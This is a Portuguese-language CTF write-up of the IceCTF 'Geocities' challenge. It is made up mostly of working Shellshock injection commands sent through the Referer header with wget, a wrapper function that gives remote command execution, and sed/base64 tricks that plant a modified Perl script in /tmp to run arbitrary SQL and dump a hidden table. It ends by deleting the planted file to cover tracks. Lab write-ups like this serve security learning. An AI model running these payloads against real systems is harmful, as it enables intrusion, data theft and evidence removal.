#Geocities
O nome do desafio já indicava que deveria ser uma falha antiga, e logo achamos que a página era vulnerável a shellshock
Segue o passo a passo

1) listar os arquivos remotos
```
wget --header "Referer: () { :; };echo; ls" "http://geocities.vuln.icec.tf" -O-

...
log.html
get_posts.pl
img
index.cgi
...
```

2) Verificada a vulnerabilidade, vamos agilizar o processo, criando uma função pra explorar a vulnerabilidade com mais facilidade
```
geo (){ wget -q --header "Referer: () { :; };echo; $*" "http://geocities.vuln.icec.tf" -O-; }
```

3) O arquivo get_posts.pl parece ser o que precisamos, dado o nome. Vamos verificar seu conteúdo
```
geo cat get_posts.pl
#!/usr/bin/perl

use strict;
use DBI;

my $dbh = DBI->connect(
    "dbi:mysql:dbname=geocities;host=icectf_mariadb",
    "geocities",
    "geocities",
    { RaiseError => 1 },
) or die $DBI::errstr;

my $sth = $dbh->prepare("SELECT * from Posts ORDER BY post_date DESC");
$sth->execute();

my $row;
while ($row = $sth->fetchrow_arrayref()) {
    print "@$row[1];@$row[2];@$row[3]\n";
}

$sth->finish();
$dbh->disconnect();
```
É um script em perl que conversa com o db local, rodando mariadb, e busca os posts.
A forma mais ágil que considerei foi criar copias desse arquivo para executar os comandos que eu queria.

então fiz o seguinte:
```
xpl=$(geo cat get_posts.pl | sed 's/my $sth.*/my $sth = $dbh->prepare("show tables;")\;/;s/print.*/print join(", ", @\$row), "\\n"\;/' | base64 -w0)
```
Essa linha basicamente substitui os comandos que o arquivo get_posts.pl descreve, para me mostrar a saída do comando sql "show tables" em uma saída legível.
Ao mesmo tempo, joguei em um pipe para encodar em base64 e armazenei em uma variável para facilitar a criação desse arquivo remotamente:

```
geo "echo $xpl | base64 -d > /tmp/318br.pl"
geo perl /tmp/318br.pl
47a6fd2ca39d2b0d6eea1c30008dd889
Posts
```

Pela cara, parece óbvio que a tabela que precisamos é essa 47a6fd2ca39d2b0d6eea1c30008dd889.
Então repetimos a edição do arquivo, para inserir o comando "select * from 47a6fd2ca39d2b0d6eea1c30008dd889"

```
xpl=$(geo cat get_posts.pl | sed 's/my $sth.*/my $sth = $dbh->prepare("select * from 47a6fd2ca39d2b0d6eea1c30008dd889;")\;/;s/print.*/print join(", ", @\$row), "\\n"\;/' | base64 -w0)
```

e repetimos a execução:

```
geo "echo $xpl | base64 -d > /tmp/318br.pl"
geo perl /tmp/318br.pl
1, IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}
```
depois disso, vamos apagar nossos rastros!

geo "rm -f /tmp/318br.pl"
